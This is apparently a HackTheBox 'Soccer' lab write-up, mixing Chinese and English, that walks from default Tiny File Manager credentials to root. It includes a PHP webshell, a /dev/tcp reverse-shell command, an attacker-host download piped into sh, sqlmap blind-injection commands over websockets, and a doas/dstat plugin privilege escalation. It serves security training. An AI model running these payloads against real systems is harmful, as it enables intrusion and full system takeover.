---
render_with_liquid: false
title: HackTheBox Writeup  Soccer
date: 2022-12-22 12:25:43 +1400
tags: [hackthebox, linux, nmap, gobuster, subdomain, whatweb, nuclei, default-credentials, tiny-file-manager, nodejs, express, file-upload, php, webshell, web-socket, sqli, boolean-based-sqli, sqlmap, linpeas, suid, doas, dstat, oscp-like-2023]
---



Soccer is an easy difficulty Linux machine that features a foothold based on default credentials, forfeiting access to a vulnerable version of the `Tiny File Manager`, which in turn leads to a reverse shell on the target system (`CVE-2021-45010`). Enumerating the target reveals a subdomain which is vulnerable to a blind SQL injection through websockets. Leveraging the SQLi leads to dumped `SSH` credentials for the `player` user, who can run `dstat` using `doas`- an alternative to `sudo`. By creating a custom `Python` plugin for `doas`, a shell as `root` is then spawned through the `SUID` bit of the `doas` binary, leading to fully escalated privileges.


# Info
---
![](/assets/obsidian/39a0e9fd5bd42a5da5fd015a64c1d2a0.png)
```css
> Name: Soccer
> IP: 10.10.11.194
> OS: Linux
```

**Author** :
- Github Repo - https://github.com/opabravo/security-writeups/
- Medium - https://medium.com/p/1e25510803fa


# Recon


## Nmap

```bash
┌──(root㉿kali)-[~]
└─# nmap -sV -sC -Pn -T4 10.10.11.194 -p- -oA soccer

# Nmap 7.93 scan initiated Thu Dec 22 12:25:43 2022 as: nmap -sV -sC -O -Pn -oA soccer 10.10.11.194
Nmap scan report for 10.10.11.194
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 22 Dec 2022 17:26:01 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 22 Dec 2022 17:26:02 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.02 seconds
```


## Enum

根據nmap http title的信息加入DNS紀錄

```bash
┌──(root㉿kali)-[~]
└─# echo "10.10.11.194 soccer.htb" >> /etc/hosts
```

查看Response Headers

```powershell
┌──(root㉿kali)-[~]
└─# whatweb soccer.htb
http://soccer.htb [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0]                                                             
```

> 首頁看似是靜態頁面，且查看原始碼無其他發現

用gobuster爆破目錄
```bash
┌──(root㉿kali)-[~]
└─# gobuster dir -u soccer.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/23 05:23:45 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 43736 / 220561 (19.83%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/12/23 05:30:50 Finished
===============================================================
```
> 找到目錄`/tiny`

觀察目錄檔名可得知為php

![](/assets/obsidian/d43816f9d6d45708feca91c1b33ced24.png)

在公司用的弱掃好夥伴 `nuclei` 也可以拿出來跑一下

```css
┌──(root㉿kali)-[~]
└─# nuclei -u soccer.htb -me soccer_index -o nuclei_soccer_index.txt

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.8.3

                projectdiscovery.io

[INF] Using Nuclei Engine 2.8.3 (latest)
[INF] Using Nuclei Templates 9.3.2 (latest)
[INF] Templates added in last update: 57
[INF] Templates loaded for scan: 4528
[INF] Targets loaded for scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 883 (Reduced 817 HTTP Requests)
[INF] Using Interactsh Server: oast.online
[nginx-version] [http] [info] http://soccer.htb [nginx/1.18.0]
[tech-detect:jsdelivr] [http] [info] http://soccer.htb
[tech-detect:bootstrap] [http] [info] http://soccer.htb
[tech-detect:nginx] [http] [info] http://soccer.htb

...

[waf-detect:nginxgeneric] [http] [info] http://soccer.htb/
[openssh-detect] [network] [info] soccer.htb:22 [SSH-2.0-OpenSSH_8.2p1 Ubuntu    
```


# User Flag

Permission Denied，要想辦法拿到 `player` 存取權

```bash
(remote) www-data@soccer:/home/player$ cat user.txt 
cat: user.txt: Permission denied
(remote) www-data@soccer:/home/player$ ls -la user.txt 
-rw-r----- 1 root player 33 Dec 23 14:13 user.txt
(remote) www-data@soccer:/home/player$ 
```


## Reverse Shell as www-data

Wappalyzer

![](/assets/obsidian/a73ca33a11177e3ff3f2edc74fae89e2.png)
> 到tiny file manager官方[github](https://github.com/prasathmani/tinyfilemanager) 
> 可找到預設帳密: `admin`:`admin@123`
> ![](/assets/obsidian/a0fcc0a0c04bf93b871d0d2f4c2e3ca9.png)

成功進入管理頁面後可上傳php web shell

![](/assets/obsidian/cb66b8855226b4da397341545cc487ff.png)

**Webshell Methods:**
1. 一句話木馬: `<?php system($_GET['cmd']); ?>` 傳 `bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"`
2. Weevely Webshell
3. `seclists`抓web shells
4. Google PHPweb shell
5. https://www.revshells.com/
6. https://github.com/swisskyrepo/PayloadsAllTheThings
7. locate webshells at local
```bash
┌──(root㉿kali)-[/usr/share/seclists/Web-Shells/PHP]
└─# locate webshell
...
/usr/share/webshells/php/php-reverse-shell.php
```

**Listener Methods:**
1. netcat + read line wrapper get reverse shell
2. Metasploit use multi handler -> `sessions -u`
3. Rich Reverse Shell: `pip3 install pwncat-cs` -> `python3 -m pwncat -l 1111 -m linux` -> CTRL + D (Detach)
4. https://www.revshells.com/

**Method 1.**

```bash
┌──(root㉿kali)-[~]
└─# rlwrap nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.11.194] 57372
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 11:03:24 up  1:51,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /etc/passwd|grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
player:x:1001:1001::/home/player:/bin/bash
```

## Enum


#### Local

列running services

```css
(remote) www-data@soccer:/var/www/html/tiny$ systemctl list-units --type=service|grep running
  accounts-daemon.service              loaded active running Accounts Service                                                             
  atd.service                          loaded active running Deferred execution scheduler                                                 
  auditd.service                       loaded active running Security Auditing Service                                                    
  cron.service                         loaded active running Regular background program processing daemon                                 
  dbus.service                         loaded active running D-Bus System Message Bus                                                     
  getty@tty1.service                   loaded active running Getty on tty1                                                                
  irqbalance.service                   loaded active running irqbalance daemon                                                            
  ModemManager.service                 loaded active running Modem Manager                                                                
  multipathd.service                   loaded active running Device-Mapper Multipath Device Controller                                    
  mysql.service                        loaded active running MySQL Community Server                                                       
  networkd-dispatcher.service          loaded active running Dispatcher daemon for systemd-networkd                                       
  nginx.service                        loaded active running A high performance web server and a reverse proxy server                     
  open-vm-tools.service                loaded active running Service for virtual machines hosted on VMware                                
  php7.4-fpm.service                   loaded active running The PHP 7.4 FastCGI Process Manager                                          
  pm2-root.service                     loaded active running PM2 process manager                                                          
  polkit.service                       loaded active running Authorization Manager                                                        
  rsyslog.service                      loaded active running System Logging Service                                                       
  snapd.service                        loaded active running Snap Daemon                                                                  
  ssh.service                          loaded active running OpenBSD Secure Shell server                                                  
  systemd-journald.service             loaded active running Journal Service                                                              
  systemd-logind.service               loaded active running Login Service                                                                
  systemd-networkd.service             loaded active running Network Service                                                              
  systemd-resolved.service             loaded active running Network Name Resolution                                                      
  systemd-udevd.service                loaded active running udev Kernel Device Manager                                                   
  udisks2.service                      loaded active running Disk Manager                                                                 
  vgauth.service                       loaded active running Authentication service for virtual machines hosted on VMware 
```

Process list

```bash
(remote) www-data@soccer:/home/player$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data    1128  0.1  0.1  54228  6624 ?        S    14:13   0:08 nginx: worker process
www-data    1129  0.2  0.1  54360  6612 ?        S    14:13   0:11 nginx: worker process
...
```

Uname

```bash
(remote) www-data@soccer:/usr/local/bin$ uname -a
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

User installed software

```bash
(remote) www-data@soccer:/usr/local/bin$ ls /usr/local/bin -la
total 64
drwxr-xr-x  2 root root  4096 Nov 17 09:09 .
drwxr-xr-x 10 root root  4096 Nov 15 21:38 ..
-rwsr-xr-x  1 root root 42224 Nov 17 09:09 doas
-rwxr-xr-x  1 root root  2002 Nov 17 09:09 doasedit
-rwxr-xr-x  1 root root  5471 Nov 17 09:09 vidoas
```

Netstat

```bash
(remote) www-data@soccer:/var/spool/mail$ netstat -ltnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1128/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1128/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                  
```

Nginx Config

```nginx
(remote) www-data@soccer:/tmp$ cat /etc/nginx/sites-available/soc-player.htb 
server {
   listen 80;
   listen [::]:80;

   server_name soc-player.soccer.htb;

   root /root/app/views;

   location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
   }
}
```

Local domain name Records:

```bash
(remote) www-data@soccer:/tmp$ cat /etc/hosts
127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb
```

#### Subdomain

根據所蒐集信息，找到一個subdomain

加到Hosts

```bash
echo "10.10.11.194 soc-player.soccer.htb" >> /etc/hosts
```

使用 node.js + express

![](/assets/obsidian/556a0491009e0053a675a45c3866d2f2.png)


## Shell as player

### SQLI in websocket

找到使用websocket的功能

![](/assets/obsidian/b968acfaa9dded5eb4cbd5b1f4f23d6d.png)

用Burp觀察websocket請求與回應，發現SQLI

![](/assets/obsidian/b9ae54b7d0cb1cacc447b881dd80addd.png)
> 就算傳任意數字，也會回傳Ticket Exists，代表後端是有吃到 `or` 語句的

做進一步SQLI類型測試，

接 `and` 去測version，確認能夠做boolean based，

先從靶機抓mysql version

```bash
(remote) www-data@soccer:/tmp$ mysql -V
mysql  Ver 8.0.31-0ubuntu0.20.04.2 for Linux on x86_64 ((Ubuntu))
```

確定測試sql `version()` 傳入 `8` 回傳 `True`

![](/assets/obsidian/21f3503d6e0ea68be6721b38703c5e35.png)

**Sqlmap:**

> **Sqlmap Websockets**
> Sqlmap supports websockets, **no need to use below proxy method**
> ```bash
> sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
{: .prompt-tip }
 >```

將 websocket 轉接到 `localhost:8081` 後 - [Tutorial](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

根據之前所取得的信息指定 `technique`、`dbms` 節省時間

```bash
sqlmap -u "http://localhost:8081/?id=78319" -p id --random-agent --dbms mysql --dbs --technique B --level 5 --risk 3 -t 5
```

因為是Boolean Based，用`--dbs`、`--tables`、`--columns` 慢慢抓

```bash
sqlmap -u "http://localhost:8081/?id=52655" --random-agent --dbms mysql --dbs --threads 10 -p id -D soccer_db -T accounts -C username,password --dump
```

```bash
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

還好password沒有hash，拿去連ssh ，用 `tee` 紀錄 CLI history

```bash
┌──(root㉿kali)-[~]
└─# ssh player@soccer.htb | tee -a ssh_history.log                                                                                                         
Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
player@soccer:~$ ls
user.txt
player@soccer:~$ cat user.txt 
e5c404bc10aeeef1c83cf0713d00cf41
```

> 拿到USER Flag - `e5c404bc10aeeef1c83cf0713d00cf41`


# Root Flag

要escalate到root，先測看看`sudo -l`，結果不能用

```bash
player@soccer:/tmp$ sudo -l -l
[sudo] password for player: 
Sorry, user player may not run sudo on localhost.
```

先用 [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 掃一下

在本機架個http server來送檔案到靶機

```bash
┌──(root㉿kali)-[~/files]
└─# ls
281  50135  linpeas.sh  lse.sh  poc.sh

┌──(root㉿kali)-[~/files]
└─# screen python3 -m http.server 80
[CTRL+A+D]
```

直接把curl的response pipe到sh，才不會在disk留下檔案

```bash
curl 10.10.14.45/linpeas.sh | sh
```

查看ssh history log

```bash
┌──(root㉿kali)-[~]
└─# less -r ssh_history.log 
```


### Doas

根據之前的 [#Enum 階段](#Enum) 與 `linpeas` 的output可發現此工具

```bash
┌──(root㉿kali)-[~]
└─# cat ssh_history.log|grep doas -E3
```

![](/assets/obsidian/9aca39cf88bfa9251068b62b0de7fadb.png)

先看看 `doas` 的manual

```css
man doas
...
DESCRIPTION
     The doas utility executes the given command as another user. 
...
EXIT STATUS
     The doas utility exits 0 on success, and >0 if an error occurs.  It may fail for one of the following reasons:

     •   The config file /usr/local/etc/doas.conf could not be parsed.
```

Quick Search on Hacktricks 
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#doas

```bash
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```
> `/usr/bin/dstat` 能夠用root執行

看看 `dstat` 的manual

```bash
player@soccer:~$ man dstat
...
FILES
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/
...           
```
> 可以放入自訂plugin，以`dstat_`開頭

找plugins dir

```bash
player@soccer:~$ ls ~/.dstat/
ls: cannot access '/home/player/.dstat/': No such file or directory
player@soccer:~$ ls /usr/bin/dstat/plugins/
ls: cannot access '/usr/bin/dstat/plugins/': Not a directory
player@soccer:~$ ls /usr/share/dstat/
__pycache__              dstat_dstat_ctxt.py     dstat_md_status.py            
...
```

`/usr/share/dstat` 沒權限建立檔案，改到 `/usr/local/share/dstat/
`
```bash
player@soccer:/usr/share/dstat$ touch  dstat_qq.py
touch: cannot touch 'dstat_qq.py': Permission denied

player@soccer:/usr/share/dstat$ cd /usr/local/share/dstat
player@soccer:/usr/local/share/dstat$ ls -la
total 8
drwxrwx--- 2 root player 4096 Dec 24 08:12 .
drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
player@soccer:/usr/local/share/dstat$ vi dstat_ok.py
player@soccer:/usr/local/share/dstat$ cat dstat_ok.py 
import os; os.system("bash -i")
```

Get Root Bash shell

```bash
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --ok
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat# id
uid=0(root) gid=0(root) groups=0(root)
root@soccer:/usr/local/share/dstat# cd ~
root@soccer:~# cat root.txt 
a3874e42bc7c69b123a341cfbaadd09d
```

> 拿到ROOT Flag - `a3874e42bc7c69b123a341cfbaadd09d`


## 總結

感覺這題難度有Medium了，只有前面Get Shell還算Easy

![](/assets/obsidian/99420ec2d9e8e5c05b48ea4d18400459.png)

- Useful Resources - https://book.hacktricks.xyz


# Additional


## PrivEsc Additional Tries

![](/assets/obsidian/827052d48fa5f007b139389a554d5a2a.png)


### CVE-2021-3560 (失敗)

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

```bash
-bash-5.0$ bash poc.sh 

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as ubuntu
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
[!]  Aborting Execution!
```


### CVE-2022-2588 (失敗) 

> Linux Kernal小於5.19未修

- 雖然soccer的Linux Kernal是5.4，但有條件不符合

從github抓CVE的POC

```bash
┌──(root㉿kali)-[~]
└─# git clone https://github.com/Markakd/CVE-2022-2588                                                                            
Cloning into 'CVE-2022-2588'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (29/29), done.
remote: Total 32 (delta 14), reused 11 (delta 2), pack-reused 0
Receiving objects: 100% (32/32), 25.14 KiB | 12.57 MiB/s, done.
Resolving deltas: 100% (14/14), done.

┌──(root㉿kali)-[~]
└─# cd CVE-2022-2588 
```

Check Compile Cmd

```bash
┌──(root㉿kali)-[~/CVE-2022-2588]
└─# ls -la
total 80
drwxr-xr-x  3 root root  4096 Dec 24 01:24 .
drwx------ 16 root root  4096 Dec 24 01:19 ..
-rwxr-xr-x  1 root root 32536 Dec 24 01:24 exp_file_credential
-rw-r--r--  1 root root 23934 Dec 24 01:19 exp_file_credential.c
drwxr-xr-x  8 root root  4096 Dec 24 01:19 .git
-rw-r--r--  1 root root    68 Dec 24 01:19 Makefile
-rw-r--r--  1 root root  7111 Dec 24 01:19 README.md

┌──(root㉿kali)-[~/CVE-2022-2588]
└─# cat Makefile 
file:
      cc -O0 exp_file_credential.c -lpthread -o exp_file_credential                                                                                                                                                                                

┌──(root㉿kali)-[~/CVE-2022-2588]
└─# cp exp_file_credential.c ../files 
```

Remote:

```bash
-bash-5.0$ wget 10.10.14.45/exp_file_credential.c
-bash-5.0$ cc -O0 exp_file_credential.c -lpthread -o qaq
-bash-5.0$ ./qaq
self path /home/player/./qaq
prepare done
Old limits -> soft limit= 14096          hard limit= 14096 
starting exploit, num of cores: 2
defrag done
spray 256 done
freed the filter object
256 freed done
double free done
spraying files
no overlap found :(...
failed
```


### Metasploit Exploit Suggester (失敗)

不得已只好試試metasploit，也失敗

```bash
msf6 post(multi/recon/local_exploit_suggester) > exploit 

[*] 10.10.11.194 - Collecting local exploits for x86/linux...
[*] 10.10.11.194 - 176 exploit checks are being tried...
[+] 10.10.11.194 - exploit/linux/local/su_login: The target appears to be vulnerable.
[*] Running check method for exploit 53 / 53
[*] 10.10.11.194 - Valid modules for session 4:
============================

 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
...

msf6 exploit(linux/local/su_login) > set session 4
session => 4
msf6 exploit(linux/local/su_login) > exploit 

[*] Started reverse TCP handler on 10.10.14.45:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Uploading payload to target
[*] Attempting to login with su
[*] Exploit completed, but no session was created.
```
